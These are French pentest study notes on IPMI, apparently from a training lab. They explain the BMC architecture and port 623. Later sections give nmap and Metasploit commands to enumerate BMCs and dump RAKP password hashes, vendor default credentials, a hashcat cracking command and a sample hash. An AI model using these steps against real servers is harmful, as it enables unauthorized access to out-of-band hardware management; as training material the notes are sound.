# IPMI

## <mark style="color:red;">**1. Définition et Présentation**</mark>

* <mark style="color:green;">**Qu'est-ce que l'IPMI ?**</mark>
  * **L'IPMI (Intelligent Platform Management Interface)** est un ensemble de spécifications normalisées pour la gestion et la surveillance des systèmes basés sur le matériel.
  * Fonctionne indépendamment du BIOS, du CPU, du firmware, et du système d'exploitation de l'hôte.
* <mark style="color:green;">**Fonctionnalités Principales :**</mark>
  * Gestion et surveillance des systèmes même lorsque le système est éteint ou non réactif.
  * Connexion réseau directe au matériel sans accès à l'OS.
  * Permet des mises à jour à distance sans accès physique au système.

***

## <mark style="color:red;">**2. Cas d'Utilisation**</mark>

* <mark style="color:green;">**Avant le démarrage du système d'exploitation :**</mark>
  * Modifier les paramètres du BIOS.
* <mark style="color:green;">**Lorsque l'hôte est complètement éteint :**</mark>
  * Surveillance et gestion du matériel.
* <mark style="color:green;">**Après une panne du système :**</mark>
  * Accès au système pour diagnostic et réparation.

***

## <mark style="color:red;">**3. Surveillance et Gestion**</mark>

* <mark style="color:green;">**Surveillance :**</mark>
  * Température du système
  * Tension
  * État des ventilateurs
  * Alimentations
* <mark style="color:green;">**Autres fonctionnalités :**</mark>
  * Requête d'informations d'inventaire
  * Revue des journaux matériels
  * Alertes via SNMP (Simple Network Management Protocol)
* <mark style="color:green;">**Exigences :**</mark>
  * Le module IPMI nécessite une source d'alimentation et une connexion LAN pour fonctionner correctement.

***

## <mark style="color:red;">**4. Composants Clés de IPMI**</mark>

* <mark style="color:green;">**Baseboard Management Controller (BMC) :**</mark>
  * Micro-contrôleur essentiel pour IPMI.
  * Intégré dans la carte mère ou ajouté comme carte PCI.
* <mark style="color:green;">**Intelligent Chassis Management Bus (ICMB) :**</mark>
  * Interface pour la communication entre châssis.
* <mark style="color:green;">**Intelligent Platform Management Bus (IPMB) :**</mark>
  * Étend le BMC pour la communication interne.
* <mark style="color:green;">**IPMI Memory :**</mark>
  * Stocke les journaux d'événements système et les données de dépôt.
* <mark style="color:green;">**Interfaces de Communication :**</mark>
  * Interfaces locales, série et LAN.
  * ICMB et PCI Management Bus.

***

## <mark style="color:red;">**5. Protocoles et Versions**</mark>

* <mark style="color:green;">**Port de communication :**</mark>
  * **Port 623 UDP** : Utilisé pour le protocole IPMI.
* <mark style="color:green;">**Versions :**</mark>
  * **IPMI 1.5** : Version initiale.
  * **IPMI 2.0** : Version actuelle, supporte la gestion via Serial over LAN.

***

## <mark style="color:red;">**6. Analyse et Détection avec Nmap et Metasploit**</mark>

* <mark style="color:green;">**Utilisation de Nmap :**</mark>
  * Commande : `nmap -sU --script ipmi-version -p 623`
  *   Exemple de sortie :

      ```bash
      PORT    STATE SERVICE
      623/udp open  asf-rmcp
      | ipmi-version:
      |   Version: IPMI-2.0
      ```
* <mark style="color:green;">**Utilisation de Metasploit :**</mark>
  *   **Module pour scanner la version IPMI :**

      ```bash
      msf6 > use auxiliary/scanner/ipmi/ipmi_version 
      msf6 auxiliary(scanner/ipmi/ipmi_version) > set rhosts 10.129.42.195
      msf6 auxiliary(scanner/ipmi/ipmi_version) > run
      ```
  *   **Module pour récupérer les hachages IPMI :**

      ```bash
      msf6 > use auxiliary/scanner/ipmi/ipmi_dumphashes 
      msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > set rhosts 10.129.42.195
      msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > run
      ```

***

## <mark style="color:red;">**7. Identifiants Par Défaut et Sécurité**</mark>

* <mark style="color:green;">**Identifiants Par Défaut :**</mark>
  * **Dell iDRAC :** `root` / `calvin`
  * **HP iLO :** `Administrator` / mot de passe aléatoire à 8 caractères
  * **Supermicro IPMI :** `ADMIN` / `ADMIN`
* <mark style="color:green;">**Risques**</mark>**&#x20;:**
  * Les mots de passe par défaut sont souvent laissés inchangés, offrant des opportunités d'accès non autorisé.
  * **Vulnérabilité du protocole RAKP (IPMI 2.0) :**
    * Expose les hachages de mot de passe avant l'authentification.
    * Les hachages peuvent être craqués hors ligne avec des outils comme Hashcat.
*   <mark style="color:green;">**Exemple de commande Hashcat :**</mark>

    ```bash
    hashcat -m 7300 ipmi.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u
    ```

***

## <mark style="color:red;">**9. Cas Pratiques et Exemples**</mark>

* **Exemple de Scan avec Nmap :**
  * Commande : `sudo nmap -sU --script ipmi-version -p 623 ilo.inlanfreight.local`
  *   Résultat :

      ```bash
      PORT    STATE SERVICE
      623/udp open  asf-rmcp
      | ipmi-version:
      |   Version: IPMI-2.0
      ```
* **Exemple de Scan avec Metasploit :**
  *   **Récupération des Hachages :**

      ```bash
      msf6 > use auxiliary/scanner/ipmi/ipmi_dumphashes
      msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > run
      ```

      *   Résultat :

          <pre class="language-bash" data-overflow="wrap"><code class="lang-bash">[+] 10.129.42.195:623 - IPMI - Hash found: ADMIN:8e160d4802040000205ee9253b6b8dac3052c837e23faa631260719fce740d45c3139a7dd4317b9ea123456789abcdefa123456789abcdef140541444d494e:a3e82878a09daa8ae3e6c22f9080f8337fe0ed7e
          </code></pre>

***
